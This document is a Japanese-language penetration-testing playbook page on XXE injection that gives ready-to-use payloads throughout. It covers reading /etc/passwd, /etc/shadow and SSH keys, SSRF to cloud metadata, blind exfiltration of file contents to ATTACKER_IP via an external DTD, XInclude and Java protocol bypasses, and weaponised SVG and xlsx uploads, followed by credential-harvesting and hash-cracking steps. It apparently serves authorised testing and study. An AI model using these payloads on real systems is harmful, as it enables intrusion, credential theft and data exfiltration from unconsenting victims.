# XXE（XML外部エンティティインジェクション）

## 着火条件
- WebアプリがXMLを入力として受け付けている（フォームのXMLアップロード・APIの `Content-Type: application/xml`・SOAPリクエスト等）
- サーバー側のXMLパーサーが外部エンティティの処理を許可している
- **XML 直接アップロードが無くても XXE 経路がある**：
  - **SVG ファイルアップロード**（プロフィール画像・チャートのインポート等）→ SVG は XML なので、画像処理ライブラリが DOCTYPE を解釈する実装で XXE が発火
  - **OOXML（`.xlsx` / `.docx` / `.pptx`）アップロード**（Excel/Word のインポート機能）→ OOXML は ZIP + XML の構造で、Apache POI / docx4j / openpyxl 等のパーサが内部 XML を処理する際に DOCTYPE を解釈する実装で発火（CVE-2014-3529 系の Apache POI XXE が代表例）
  - **画像メタデータ系**（SVG / XMP メタデータ）・**RSS / Atom フィードのインポート**・**SAML Response の処理**（IdP-Initiated SSO）も全て XML パーサが裏で動く

## 環境前提
- 実行環境: テスター端末（ペイロード作成）/ ターゲット（XML処理実行）
- 必要なツール: Burp Suite（リクエスト改ざん）、テキストエディタ
- Blind XXEにはコールバック受信が必要（`python3 -m http.server`・テスター側の到達可能インターフェースのIP確認）
- オフライン代替: Blind XXE用のHTTPサーバーは `python3 -m http.server` で代替可能

## 観点・着眼点

**先に確認すること：**

- リクエストの `Content-Type` が `application/xml` または `text/xml` か
- フォームにXMLファイルアップロード機能があるか
- エラーメッセージにXMLパーサー名（Expat・libxml2・Xerces等）が含まれていないか
- SOAP API・REST APIでXMLを受け付けているか

**出力の有無で手法が変わる：**

- エンティティの値がレスポンスに反映される → クラシックXXE（ファイル読み込み・SSRF）
- レスポンスには反映されないがサーバーが処理する → Blind XXE（OOBで外部サーバーに送出）

**XXE成立のシグナル：**

- XML中のエンティティ参照（`&xxe;`）がエラーなく処理されレスポンスに値が含まれる → XXE成立
- `DTD is prohibited` / `DOCTYPE is not allowed` が返る → DOCTYPEブロッキングが有効。この脆弱性は使えない
- エンティティ参照がそのまま文字列として出力される → パーサーがエンティティ展開を行っていない（無効化済み）

## 手順

**① クラシックXXE（ファイル読み込み）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

`<data>` 要素の値がレスポンスに含まれるフィールドで試す。

**ファイルが読めたら次にすること：**

`/etc/passwd` の内容が取得できたら以下の順で展開する。

1. **有効なユーザーを特定する**：`/etc/passwd` は `username:x:uid:gid:comment:home:shell` の7フィールド構成。末尾（7番目）がシェルで、6番目がホームディレクトリ。

   ```
   alice:x:1001:1001::/home/alice:/bin/bash     ← 有効（/bin/bash）
   www-data:x:33:33::/var/www:/usr/sbin/nologin ← 除外（nologin）
   root:x:0:0:root:/root:/bin/bash              ← 有効（rootは特に重要）
   ```
2. **有効ユーザーの資産を読む**：
   - `file:///home/USERNAME/.ssh/id_rsa` — SSH 秘密鍵（あれば直接ログインへ）
   - `file:///home/USERNAME/.bash_history` — 過去コマンドに認証情報が残ることがある
3. **Webアプリ設定ファイルを読む**：アプリのドキュメントルート・設定ディレクトリはアプリ名で検索して特定する（`../../05_Tools_Reference/Searchsploit.md` の「製品構造調査」参照）
4. **`/etc/shadow` が読める場合**はユーザーのハッシュを取得してクラック → `../../05_Tools_Reference/Hashcat.md`

→ 取得した認証情報の確認手順 → `../Credential_Discovery.md`（パスワード使い回し確認の表）

**② パスのバリエーション**

```xml
<!-- Linuxの絶対パス -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">

<!-- Windowsの場合 -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">

<!-- 相対パス（アプリの動作ディレクトリ起点） -->
<!ENTITY xxe SYSTEM "../../../etc/passwd">
```

**③ 内部ネットワーク探索（SSRF転用）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

AWSメタデータエンドポイントへのアクセス確認。クラウド環境でのSSRF。内部ポートスキャンにも使える（`http://127.0.0.1:PORT/`）。

**④ Blind XXE（OOB送出）**

コールバック受信が必要。テスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）のIPを確認してから行う。

```bash
# [Attacker] コールバック受信
ip a   # 全インターフェースのIPを確認
python3 -m http.server 8000
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/xxe_test">
]>
<root><data>&xxe;</data></root>
```

**⑤ Blind XXE + 外部DTD（ファイル内容の外部送出）**

> インラインDTD内ではパラメータエンティティ（`%`）をコンテンツ内で直接展開できない制約があるため、外部DTDファイルに記述を逃がす必要がある。

ファイル内容をOOBで送出する方法。攻撃側サーバーに外部DTDファイルを配置する。

```xml
<!-- [Attacker] evil.dtd として http://ATTACKER_IP:8000/evil.dtd に配置 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER_IP:8000/?data=%file;'>">
%exfil;
%send;
```

```xml
<!-- ターゲットに送るXML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/evil.dtd">
  %remote;
]>
<root><data>trigger</data></root>
```

> コールバック受信の詳細 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）

**⑥ PHP環境での Base64 エンコード取得**

ファイルにXMLとして不正な文字（`<` `&` など）が含まれているとパースエラーになる場合、PHPラッパーでBase64化して取得する。

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

レスポンスに含まれるBase64文字列を `base64 -d` でデコードする。

```bash
echo "BASE64_STRING" | base64 -d   # [Attacker]
```

> 原理 → `../../06_Concepts/XSLT_XML_Processing.md`

**⑦ XInclude による DOCTYPE 完全ブロック環境の迂回**

`DOCTYPE is not allowed` で DTD が完全に無効化されている環境でも、**XInclude (`http://www.w3.org/2001/XInclude`)** が有効化された XML パーサであれば DTD なしでファイル読み込みができる。DTD ブロック (`DOCTYPE`) と XInclude (`xi:include`) は別の仕様であり、片方だけ無効化している実装が多い。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

- `parse="text"` を付けないと XML としてパースされる（`/etc/passwd` は XML ではないのでエラー）
- libxml2 / Xerces / .NET XmlReader が `XInclude` を有効化していると発火
- DOCTYPE ブロックは突破できるが、XInclude 自体が無効化されている環境では発火しない

**⑧ Java 環境特有の SSRF / file read プロトコル**

Java の XML パーサ（JAXP / Xerces）は **URL handler 経由で多様なプロトコルをサポート**しており、`file://` `http://` 以外にも以下が刺さる:

```xml
<!-- JAR: jar:!/ を使って ZIP/JAR 内部のファイル読み込み -->
<!ENTITY xxe SYSTEM "jar:http://[ATTACKER_HOST]/evil.jar!/data.txt">
<!-- 攻撃者 HTTP サーバから .jar (= ZIP) を取得 → 中の data.txt が読まれる -->
<!-- 副作用: Java が .jar を /tmp に展開する処理を悪用すると一時ファイル経由の race condition も -->

<!-- netdoc: Java 古典・file:// が WAF で block されているとき迂回経路 -->
<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">

<!-- ftp: 認証 prompt の有無で内部ホスト存在確認（Blind SSRF 経路） -->
<!ENTITY xxe SYSTEM "ftp://internal-host:21/">

<!-- gopher: 古い Java 8 以下では HTTP / Redis / SMTP に任意プロトコル送信可（SSRF 経路） -->
<!ENTITY xxe SYSTEM "gopher://internal-host:6379/_FLUSHALL%0d%0aSET%20pwn">
```

> Java 9 以降は `jdk.xml.disallowDoctypeDecl=true` がデフォルトの環境が増えているが、レガシーアプリ・Spring Boot 2 系・古い Tomcat デプロイでは未設定のことが多い。

**⑨ SVG アップロード経由の XXE**

プロフィール画像 / アイコン / チャートインポートで SVG が受け入れられる場合、SVG は XML なので XXE ペイロードを仕込める。**ImageMagick / Inkscape / librsvg / rsvg-convert** など SVG をパースするライブラリが DOCTYPE を処理する設定だと発火。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="50">&xxe;</text>
</svg>
```

アップロード後、SVG が画面に表示される場合は `<text>` 内の `&xxe;` がレンダリング時にファイル内容に展開される。サムネイル生成のみの場合は Blind XXE（⑤）に切り替え。

**⑩ OOXML（xlsx / docx）経由の XXE**

`.xlsx` / `.docx` / `.pptx` は ZIP アーカイブで、中に `[Content_Types].xml`・`word/document.xml`・`xl/workbook.xml` 等の XML が入っている。アプリが Apache POI / docx4j / openpyxl 等でパースするとき、内部 XML の DOCTYPE が処理される実装で発火（CVE-2014-3529 系・Apache POI 3.10.1 以前など）。

```bash
# [Attacker] 1. 正規の .xlsx を作って unzip
cp legitimate.xlsx payload.xlsx
unzip payload.xlsx -d payload_unzipped/

# [Attacker] 2. 内部 XML（xl/workbook.xml など）に DOCTYPE を仕込む
# 先頭の <?xml ...?> の直後に以下を挿入:
#   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# そして任意のテキスト要素に &xxe; を埋め込む

# [Attacker] 3. 再圧縮（ZIP として）
cd payload_unzipped/
zip -r ../payload_xxe.xlsx .
cd ..

# [Attacker] 4. アプリにアップロード → パース時に XXE 発火
```

エラーメッセージにファイル内容が含まれる経路 / 取り込んだスプレッドシートのセル値として表示される経路 / Blind XXE OOB 経路のいずれかで exfil。

## 刺さらなかったとき

- `DTD is prohibited` / `DOCTYPE is not allowed` → DOCTYPEブロッキングが有効。**⑦ XInclude (`xi:include`) を試す**（DTD ブロックと XInclude は別仕様で片方だけ無効化されている実装が多い）。XInclude もダメなら XPath インジェクション・パラメータ改ざんを検討
- `Entity 'xxe' not defined` → 宣言構文が間違っている。`<!ENTITY xxe SYSTEM "...">` の構文を確認する
- エンティティ参照がそのまま文字列として出力される → パーサーがエンティティ展開を無効化している。XXEは使えない
- `Cannot resolve URI` → ファイルパスの形式が違う（`file://` と `file:///` の違い）または対象ファイルの読み込み権限不足。Java 環境なら ⑧ の `netdoc:` / `jar:` プロトコルへ切替
- ファイルを読めるが内容が空 → XMLとして不正な文字が含まれている。⑥のPHPラッパー（Base64）を試す
- XML 直接送信ができない（フォームに XML 受付なし）→ ⑨ SVG アップロード・⑩ OOXML アップロード・RSS/SAML 等の隠れ XML 経路を探す

## 注意点・落とし穴

- XMLのエンティティ値に `<` や `&` が含まれるとパースエラーになり内容が出力されない。PHP環境なら `php://filter/convert.base64-encode/resource=` でBase64化する
- 多くの最新フレームワーク（Laravel・Spring等）はデフォルトで外部エンティティを無効化しているため、古い設定のアプリ・カスタムパーサー・古いバージョンのフレームワークで有効なことが多い
- SOAPリクエストでもXXEが成立する場合がある。`Content-Type: text/xml` に変えてボディにDOCTYPEを挿入して試す
- パラメータエンティティ（`%xxe;`）と一般エンティティ（`&xxe;`）を混同すると動作しない。コンテンツ内の参照には `&` を使う

## 関連技術
- 前：XMLアップロード機能の発見・リクエストのContent-Type確認 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：ファイル読み込みで認証情報取得 → `../Credential_Discovery.md`
- 後：XSLT処理が存在する場合はXSLTインジェクションも試す → `./XSLT_Injection.md`
- 後：内部ネットワーク探索（SSRF） → `./SSRF.md`
- 後：取得した /etc/shadow ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- 関連：製品構造調査・設定ファイルパスの特定 → `../../05_Tools_Reference/Searchsploit.md`
- 関連：Blind XXE のコールバック受信・到達可能 IP の確認 → `../../06_Concepts/Reverse_Shell.md`
- 関連：XXE が成立する仕組み（XML パーサーの外部エンティティ処理）→ `../../06_Concepts/XSLT_XML_Processing.md`
